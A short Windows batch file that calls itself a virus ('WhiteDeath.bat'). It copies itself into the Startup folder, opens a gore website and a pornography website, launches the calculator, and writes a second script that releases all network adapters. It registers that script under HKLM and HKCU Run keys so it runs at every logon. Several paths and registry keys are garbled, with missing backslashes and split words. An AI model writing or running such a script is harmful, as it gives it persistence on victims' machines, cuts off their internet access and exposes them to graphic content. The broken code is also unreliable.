@echo off

rem Copys Virus To Startup On Open
copy "WhiteDeath.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

rem random stuff
timeout /t 8 > nul

start "http://www.bestgore.fun"

timeout /t 9 > nul

start "http://www.pornhub.com"

timeout /t 11 > nul

start calc.exe

rem perm no internet
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
